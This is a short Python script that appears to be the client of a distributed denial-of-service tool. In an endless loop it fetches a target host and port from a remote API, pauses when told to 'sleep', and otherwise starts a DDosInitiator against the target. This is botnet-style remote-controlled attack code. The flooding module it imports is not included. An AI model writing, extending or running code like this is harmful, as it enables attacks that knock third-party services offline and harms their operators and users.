import time
from client.api import API
from client.dos import DDosInitiator


# Get API data and start DDoS locally
def main():
    di = DDosInitiator()
    while True:
        api = API()
        data = api.get_data()
        if api.get_state() == 'sleep':
            print("\033[91mSleeping now!\033[0m")
            di.work = False
            time.sleep(5)
            continue
        di.work = True
        di.start(target_host=data["host"], target_port=data["port"])


if __name__ == '__main__':
    main()
